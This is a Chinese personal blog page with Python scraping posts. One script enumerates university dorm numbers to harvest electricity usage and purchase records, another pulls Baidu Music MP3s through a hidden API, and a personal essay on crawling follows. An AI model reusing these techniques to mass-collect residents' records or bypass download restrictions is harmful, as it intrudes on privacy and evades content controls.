class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">用电信息</span><br><span class="line">http://ydcx.bupt.edu.cn/Default.aspx</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">"Reverland"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml.html <span class="keyword">import</span> fromstring</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">30</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.makedirs(<span class="string">'data'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_info</span><span class="params">(dorm_num, root)</span>:</span></span><br><span class="line">    <span class="comment"># skip for downloaded</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>):</span><br><span class="line">        <span class="keyword">print</span> dorm_num + <span class="string">'buy info downloaded...'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    data = root.xpath(<span class="string">'//table[@id="GridView2"]/tr/td/font/text()'</span>)</span><br><span class="line">    <span class="comment"># header</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'timestamp, electric_increase, money, charge_bool, state, operator\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="comment"># timestamp, electric_increase, money, charge_bool, state, operator</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> &lt; <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i].encode(<span class="string">'iso-8859-1'</span>).strip() + <span class="string">','</span>)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i].encode(<span class="string">'iso-8859-1'</span>).strip() + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dorm_elec</span><span class="params">(dorm_num)</span>:</span></span><br><span class="line">    <span class="comment"># skip for downloaded</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>):</span><br><span class="line">        <span class="keyword">print</span> dorm_num + <span class="string">' downloaded...'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"parsing "</span> + dorm_num + <span class="string">' now...'</span></span><br><span class="line">    data = []</span><br><span class="line">    r = requests.get(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num)</span><br><span class="line">    <span class="comment">## parse the content</span></span><br><span class="line">    root = fromstring(r.content)</span><br><span class="line">    <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">    __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">    __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">## __EVENTTARGET is fixed</span></span><br><span class="line">    __EVENTTARGET = <span class="string">'GridView1'</span></span><br><span class="line">    buy_info(dorm_num, root)</span><br><span class="line">    <span class="comment">## define headers</span></span><br><span class="line">    header = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">    &#125;</span><br><span class="line">    np = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># First extract some value</span></span><br><span class="line">        <span class="comment"># print "Retrieving data from page", np</span></span><br><span class="line">        __EVENTARGUMENT = <span class="string">'Page$'</span> + str(np)</span><br><span class="line">        payload = &#123;</span><br><span class="line">        <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">        <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">        <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">        <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">        r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">        <span class="comment">## get electric data</span></span><br><span class="line">        data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">        <span class="comment">## get current page numbers</span></span><br><span class="line">        cpn = re.findall(<span class="string">'\)"&gt;&lt;font color="#4A3C8C"&gt;([\d]+)'</span>, r.content)</span><br><span class="line">        <span class="keyword">if</span> (int(cpn[-<span class="number">1</span>]) == np - <span class="number">1</span>) <span class="keyword">or</span> (int(cpn[-<span class="number">1</span>]) % <span class="number">10</span> != <span class="number">0</span>):</span><br><span class="line">            cpn = range(np+<span class="number">1</span>, int(cpn[-<span class="number">1</span>]) + <span class="number">1</span>)</span><br><span class="line">            <span class="comment">## next page</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> cpn:</span><br><span class="line">                <span class="comment">## parse the content</span></span><br><span class="line">                root = fromstring(r.content)</span><br><span class="line">                <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">                __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">                __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">                __EVENTARGUMENT = <span class="string">'Page$'</span>+ str(p)</span><br><span class="line">                payload = &#123;</span><br><span class="line">                <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">                <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">                <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">                <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">                r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">                data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">                <span class="comment"># print "Retrieving data from page", p</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">## next page</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> cpn:</span><br><span class="line">            <span class="comment">## parse the content</span></span><br><span class="line">            root = fromstring(r.content)</span><br><span class="line">            <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">            __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">            __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">            __EVENTARGUMENT = <span class="string">'Page$'</span> + p</span><br><span class="line">            payload = &#123;</span><br><span class="line">            <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">            <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">            <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">            <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">            r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">            data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">            <span class="comment"># print "Retrieving data from page", p</span></span><br><span class="line">        <span class="comment"># check if reach end</span></span><br><span class="line">        np = int(cpn[-<span class="number">1</span>]) + <span class="number">1</span></span><br><span class="line">    <span class="comment"># write header</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'timestamp'</span> + <span class="string">','</span> + <span class="string">'electric_remain\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i] + <span class="string">','</span>)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i] + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    <span class="comment">## for example</span></span><br><span class="line">    <span class="comment"># __EVENTVALIDATION = '/wEWCwKhncT7DwKtsp64BAKtsuK4BAKtsva4BAKtsvq4BAKtsu64BAKtsvK4BAKtssa4BAKtssq4BALDuK6IBQKokYx1vYI/vd4i5UCVuVYMSo/l30x1o/g='</span></span><br><span class="line">    <span class="comment"># __EVENTARGUMENT = 'Page$2'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#data = parse_dorm_elec(dorm_num)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dorm_elec_wrap</span><span class="params">(dorm_num)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parse_dorm_elec(dorm_num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"parsing "</span> + dorm_num + <span class="string">" error..."</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------</span></span><br><span class="line"><span class="comment"># # dorm 10</span></span><br><span class="line"><span class="comment"># dorms = []</span></span><br><span class="line"><span class="comment"># # layer 1</span></span><br><span class="line"><span class="comment"># dorms += map(lambda x: '10-1' + str(x).zfill(2), range(1, 17))</span></span><br><span class="line"><span class="comment"># # layer 2</span></span><br><span class="line"><span class="comment"># dorms += map(lambda x: '10-2' + str(x).zfill(2), range(1, 21))</span></span><br><span class="line"><span class="comment"># # layer 3 to 7</span></span><br><span class="line"><span class="comment"># for l in range(3, 8):</span></span><br><span class="line"><span class="comment">#     dorms += map(lambda x: '10-' + str(l) + str(x).zfill(2), range(1, 72))</span></span><br><span class="line"><span class="comment"># # layer 8 to 13</span></span><br><span class="line"><span class="comment"># for l in range(8, 14):</span></span><br><span class="line"><span class="comment">#     dorms += map(lambda x: '10-' + str(l) + str(x).zfill(2) , range(1, 53))</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------</span></span><br><span class="line"><span class="comment"># dorm 1</span></span><br><span class="line">dorms = []</span><br><span class="line"><span class="comment"># layer 1</span></span><br><span class="line">dorms += map(<span class="keyword">lambda</span> x: <span class="string">'1-'</span> + str(<span class="number">1</span>) + str(x).zfill(<span class="number">2</span>), range(<span class="number">1</span>, <span class="number">24</span>))</span><br><span class="line"><span class="comment"># layer 2,5</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">6</span>):</span><br><span class="line">    dorms += map(<span class="keyword">lambda</span> x: <span class="string">'1-'</span> + str(l) + str(x).zfill(<span class="number">2</span>), range(<span class="number">1</span>, <span class="number">27</span>))</span><br><span class="line"><span class="comment">#--------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for d in dorms:</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         parse_dorm_elec_wrap(d)</span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         try:</span></span><br><span class="line"><span class="comment">#             parse_dorm_elec_wrap(d)</span></span><br><span class="line"><span class="comment">#         except:</span></span><br><span class="line"><span class="comment">#             print "Error with ", d</span></span><br><span class="line"><span class="comment">#             pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">5</span>)</span><br><span class="line">pool.join(timeout=timeout)</span><br><span class="line">pool.map(parse_dorm_elec_wrap, dorms)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print dorms</span></span><br><span class="line"><span class="comment"># parse_dorm_elec('10-1220')</span></span><br></pre></td></tr></table></figure>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/02/baidu-music/" itemprop="url">
                  Python Spider: 爬取百度音乐
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-02T00:00:00+08:00" content="2015-04-02">
              2015-04-02
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/02/baidu-music/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/02/baidu-music/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="Take_a_sad_song,_and_make_it_better：爬取百度音乐">Take a sad song, and make it better：爬取百度音乐</h2><p>以下，个人的一个trial and error的过程，仅供参考。</p>
<p>用到一些基本知识比如HTTP请求啊，html啊，json啊，ajax啊，当然，不懂也没关系……<br>使用了一些工具比如firefox啊，firebug啊，python啊……当然你们喜欢用chrome/chromium还是IE都一样……</p>
<p>也许是我听的歌太小众了，经常会发现有些歌在线听的好好的，竟然没有下载链接</p>
<p><img src="/images/spider/baidu_music.png" alt="" title="baidu音乐">]</p>
<p>对此，很不理解，在线可以听到就说明浏览器已经把媒体文件下载下来并且播放出来了……为啥会告诉我没有下载链接？</p>
<p>某天，听到Beatles的Hey Jude，我忽然觉得得动手找找音乐文件是哪里的。于是，打开firebug，选择network标签下的media标签，可是什么也没有。</p>
<p><img src="/images/spider/baidumusic.png" alt=""></p>
<p>唉？于是又确认了下，百度音乐在线播放器不是flash，满满的html5标签= =</p>
<p>凭借直觉，应该和xmlhttprequest有关系，于是抱着试试看的心理打开firebug上的xhr标签</p>
<p><img src="/images/spider/baidumusic1.png" alt=""></p>
<p>哇，果然有好多请求，咦？songlink？凭借直觉似乎是音乐链接地址……</p>
<p>打开返回的json看了看果然有个来自file.qianqian.com的疑似歌曲链接(有时候用firebug的搜索功能也不失为良策)……</p>
<p><img src="/images/spider/baidumusic3.png" alt=""></p>
<p>把引号中的链接复制粘帖到地址栏，哇，果然是歌曲mp3啊</p>
<p><img src="/images/spider/baidumusic4.png" alt=""></p>
<p>我们可以再认真看看返回的json，其中有lrc歌词链接，有封面图片链接、歌曲文件大小啊等等</p>
<p>接下来的问题是，如果想下载其它歌曲怎么办。首先观察之前我们获取想要mp3链接的POST请求。</p>
<p><img src="/images/spider/baidumusic2.png" alt=""></p>
<p>请求参数中有一个songID？似乎很清晰的样子，我猜吧，每个歌曲在百度音乐库中都对应这么一个ID</p>
<p>后来发现确实差不多。</p>
<p>至此，可以开始写自己的爬虫了……</p>
<p>关键部分大致这样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_by_song_id_list</span><span class="params">(song_id_list)</span>:</span></span><br><span class="line">    song_data = <span class="string">'songIds='</span> + <span class="string">"%2C"</span>.join(song_id_list)</span><br><span class="line">    song_link_url = <span class="string">"http://play.baidu.com/data/music/songlink"</span></span><br><span class="line">    headers = &#123;<span class="string">"X-Requested-With"</span>: <span class="string">"XMLHttpRequest"</span>,</span><br><span class="line">               <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded;\</span><br><span class="line">               charset=UTF-8"</span>&#125;</span><br><span class="line">    r = requests.post(song_link_url, data=song_data, headers=headers)</span><br><span class="line">    data = json.loads(r.content)</span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> data[<span class="string">'data'</span>][<span class="string">'songList'</span>]:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + it[<span class="string">'songName'</span>], <span class="string">': '</span>, it[<span class="string">'size'</span>], <span class="string">"bytes"</span></span><br><span class="line">        <span class="comment"># print it['songLink']</span></span><br><span class="line">        r_song = requests.get(it[<span class="string">'songLink'</span>], stream=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">with</span> open(it[<span class="string">'songName'</span>] + <span class="string">'.'</span> + it[<span class="string">'format'</span>], <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            dl = <span class="number">0</span></span><br><span class="line">            total_length = int(it[<span class="string">'size'</span>])</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> r_song.iter_content():</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> b:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                dl += len(b)</span><br><span class="line">                f.write(b)</span><br><span class="line">                done = int(<span class="number">50</span> * dl / total_length)</span><br><span class="line">                sys.stdout.write(<span class="string">"\r[%s%s] %.2f%%"</span></span><br><span class="line">                                 % (<span class="string">'='</span> * done, <span class="string">' '</span></span><br><span class="line">                                    * (<span class="number">50</span> - done), <span class="number">100.0</span> * dl / total_length))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'\n'</span> + it[<span class="string">'songName'</span>] + <span class="string">'.'</span> + it[<span class="string">'format'</span>], <span class="string">" finished"</span></span><br></pre></td></tr></table></figure>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/01/python-spider-quick-and-dirty-way/" itemprop="url">
                  Python Spider: a Quick and Dirty Aproach
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-01T00:00:00+08:00" content="2015-04-01">
              2015-04-01
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/01/python-spider-quick-and-dirty-way/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/01/python-spider-quick-and-dirty-way/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>面试的时候，面试官问我这些年瞎折腾有什么主线，我说有，但又不想说我他妈的其实想做的是发现数据中的知识，我要构建用户和产品的桥梁，让设计师的梦想照进现实。更不好露出自己的獠牙恶狠狠地说，而不是你们扯jb淡的安全。想了想，还是说了些不着边际的东西。这违背的初心和四处的张望自然没有逃过面试官一双柔和但不失犀利而充满智慧双瞳，我感受到那友善的目光，知道这安全的面试到头了。</p>
<p>想要分析数据，首先要有数据。得益于互联网蝗虫般铺天盖地的扩张，数据渐渐不再是问题。专业的数据科学家会从某些高质量的数据仓库下载供他们玩弄各种理论算法和工具的数据，我是野路子，从一开始，就开始自己去爬取数据，清理数据，当然，最后依然在这个脏活累活的阶段，比那些张口深度学习闭口大数据的数据科学家低到不知道哪里去了。</p>
<p>写爬虫是个很意外的开始，好奇人人上好友之间的关系，认真学习的第一门语言是R，因为上课挺老师说sas太贵了，上课是因为数学建模，数学建模是因为被同学晃进去了，总之，我从来没觉得命运是掌握在自己手中的，或者积极点，很高兴人生是充满意外和惊喜的。</p>
<p>总之，精通R语言的陈某某在统计之都上发了个R做聚类的什么文章，其中的某张图意外的击中了我哪根不对头的神经，不知不觉酝酿了多年后，就成了现在这个鬼样子。</p>
<p>后来做安全，听到那些高深莫测的高人们一致同意渗透的第一步和最重要的一步就是信息搜集。为了表示自己是属于高人哪一类的，我举起了四只脚表示同意。于是就开始各种写爬虫搜集信息，从某个站点所有的文档中的元信息到返回信息等等，但我从不做坏事，我只下载公开信息，显然安全专家们觉得我这点非常low，谈及此事，它们不屑一顾，而是不断的问我有什么光环，挖出过什么漏洞。我自然没有，终于也只是在第一个层级上不断搜集信息。</p>
<p>有段时间做爬虫，团队有个愿景是把全宇宙的网站都爬下来，这当然不是我们的愿景，但这只能是我们的愿景。我们开着2M联通小水管，开始phantomjs刷刷刷，搜集互联网上来路不明的代理，不断切换刷刷刷，最后做了些什么我也不知道。投资人显然对此不甚满意，我们太low了，没有做到什么百万并发千万集群，也没有统治宇宙。但投资人眼里某些公司做到了，然后，没钱就没有然后了。</p>
<p>于是，我依然很low，数据科学家看不上、爬虫专家们看不上、安全专家们看不上、做底层和硬件的觉得我朽木难雕。总之，它们好像心有灵犀似的，都相互默契的微微一笑，对我说出了那句熟悉的台词：你是个好人，但我们不合适。我想了很久，却觉得话里透露着其它意思，好像夜里狮子的心，狼子的肺似的总让人觉得不对劲，夜里翻来覆去无数遍，重放了多次之前的场景，之前的只言片语终于串联起来，都明明白白指着一个意思：你哪方面都很渣啊。</p>
<p>这让我感到惶恐，又有些些许无奈，我觉得那些面试官们都是好人，也佩服和仰慕他们在领域内的修为。他们谆谆教导我可以去看看这些那些，耐心地对我进行指引。我的理智非常感激它们，身体却无比诚实。那时，在身边刷题算法的大潮涌动下，我立下誓言，我他妈的要刷算法去谷歌，然后打开leetcode看了两行，就知道谷歌比我不知道高到哪里去了。我这种算法结构一窍不通，编译链接通通报错的渣渣就开始做把杭州某巨大集团招聘信息转换成组织架构这种于人于己都无关紧要吃力不讨好的事。如果你看过王小波的某本书，你会知道这是个减熵的过程。这绝对违背自然规律，也违背我想要为社会做贡献，让公司赚大钱，让世界更美好的崇高理想。</p>
<p>总之，我的理想已经碎了。</p>
<p>多年前，我看到个人计算机的发明者去做牙医，妇科圣手玩转安全、乔布斯不好好学习学习字体理论等等不务正业的故事都深受鼓舞，现在忽然就发现这其实是世界的险恶用心，不，应该是世界的温柔。</p>
<p>在大学的某个时候走上的歪路，是时候终结了。我想过成为一名心理医生、一名律师、一名原画师，一名设计师、一名光学工程师、一个前端工程师、一个数据挖掘工程师、一个误人子弟的老师、一个做或不做技术的销售，一个满嘴跑火车产品经理、一个天马星空运营专员，一个文笔自由的诗人、一个想唱就唱的行吟歌手<br>……现在，该醒醒了。照照镜子，看看镜子中狼狈不堪的那只，凄厉地汪两声感觉下现实冰冷的空气。</p>
<p>这才发现跑题跑得好远，思维跳跃和宽广这种属性在某个工业社会里一定不是什么好事，因为成为一个产线上可以替换的零件比成为一个人重要的多。但是，现在这个世界身在何处，又要往哪里去呢？</p>
<p>总之，这篇文章是回顾下哪些年写过的渣爬虫，而不是扯淡。我喜欢这种感觉要完蛋了他妈的结果又回光返照的奇葩经历。你们听过燕姿的天嘿嘿么，每当到某个地方时，我都觉得这首歌唱完了，结果她又来了一句。</p>
<p>就是这样。</p>
<p>所以，又多说一句。某个不错地方的技术面问了这么个问题，你对加班怎么看，你能不能抗住巨大的工作压力。我不知道这个问题的初心是啥，总之觉得又不是新部门或者创业公司，该部门的管理很差劲效率极低，同时不把员工当人看。又一个朋友去了一家小小的创业公司，虽然每天晚上最早十点多才回，却私下跟我说氛围比较轻松其实挺开心的，这是某个一到下班恨不得每个人都逃离的某某地方望尘莫及的。所以怎么看，把个人动力和公司利益结合起来是我等随时可替换的渣渣工人毕生人生追求，我自觉在这条卖身的道路上卖的还不够不可持续发展，需要更加努力的提升自己的思想道德水平。当然，冠冕堂皇的说辞还是抄袭左耳朵耗子老师比较稳妥。</p>
<p>祝上文提到的创业公司发展壮大，该团队还有我很崇拜的大神呢ლ(╹◡╹ლ)</p>
<p>以下是正文，我之前发在byr论坛上，现在搬到一起，向过去告别：</p>
<hr>
<p>你用python做什么？</p>
<p>很严肃的东西：比如项目、工作、比如blablabla</p>
<p>你学一门语言为了干什么？</p>
<p>因为好奇、因为想提高自己、因为blablabla</p>
<p>然而一门语言真正能干什么？</p>
<p>复杂的东西离我们太远，我们不用构建一个成千上万用户级的大型网站、不用计算火箭轨道、不用尝试穷举破解密码系统，不用在云端与大数据共舞，在集群中并行。那些听上去离我们很远。</p>
<p>简单的东西太不堪入目。打印出钻石型的字符串、编写一个能读取我们输入的C程序、计算一个字符串的长度，做小学应用题……</p>
<p>一门语言应该这样、即使没有深厚的数据结构和算法基础，你依然知道可以用它来真正的做到你想要做的事情。同时不用过分陷入底层的细节和种种优化问题。</p>
<p>我觉得python一定程度上做到了这点，真的是一门属于每个人的计算机语言。无论他/她是什么背景。</p>
<p>Let’s Rock With Python now.</p>
<p>For fun and profit.</p>
<ul>
<li>工欲善其事，必先利其器</li>
<li>百度音乐（requests）</li>
<li>学生购电网络查询系统: 用电数据爬取(requests+lxml)</li>
<li>超星数字图书馆(北邮镜像): 在线阅读书籍爬取转换(selenium)</li>
<li>北京邮电大学迎新网：新生宿舍情况爬取(selenium)</li>
